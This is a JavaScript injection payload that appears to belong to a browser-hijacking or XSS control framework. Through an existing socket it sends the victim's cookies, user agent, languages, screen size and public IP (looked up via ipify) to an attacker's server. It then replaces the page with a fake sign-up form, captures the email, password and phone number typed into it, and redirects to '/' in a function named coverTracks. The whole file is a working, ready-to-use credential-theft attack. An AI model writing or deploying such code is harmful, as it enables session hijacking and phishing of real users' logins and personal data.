const connection = c;


const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign Up</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background-color: #222;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            width: 300px;
        }

        h1 {
            text-align: center;
        }

        .input-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
        }

        input[type="email"],
        input[type="password"],
        input[type="tel"] {
            width: 94%;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        button {
            background-color: #333;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            width: 100%;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #555;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>Sign Up</h1>
    <form id="signup-form">
        <div class="input-group">
            <label for="email">Email:</label>
            <input type="email" id="email" placeholder="example@gmail.com" required>
        </div>
        <div class="input-group">
            <label for="password">Password:</label>
            <input type="password" id="password" required>
        </div>
        <div class="input-group">
            <label for="phone">Phone:</label>
            <input type="tel" id="phone">
        </div>
        <button type="submit">Sign Up</button>
    </form>
</div>
</body>
</html>`

function sendEvent(event, data) {
    connection.send(JSON.stringify({
        'event': event,
        ...data
    }))
}

function printOnServer(name, content) {
    sendEvent(
        'print',
        {
            'name': name,
            'content': content
        }
    )
}

function sendHello() {
    sendEvent(
        'hello',
        {
            'user_agent': navigator.userAgent
        }
    )
}

sendHello()
printOnServer('Cookies:', document.cookie)
printOnServer('Resolution:', screen.availWidth.toString() + 'x' + screen.availHeight.toString())
printOnServer('User Agent:', navigator.userAgent)
printOnServer('Languages:', navigator.languages.toString())


function stealCreds() {
    document.open()
    document.write(html)
    document.close()

    const signupForm = document.getElementById('signup-form');

    signupForm.addEventListener('submit', function (event) {
        event.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const phone = document.getElementById('phone').value;
        printOnServer('Email:', email)
        printOnServer('Password:', password)
        printOnServer('Phone:', phone)
        coverTracks()
    });
}

function coverTracks() {
    window.location.href = '/'
}

fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
        printOnServer('IP:', data.ip)

        stealCreds()
    });
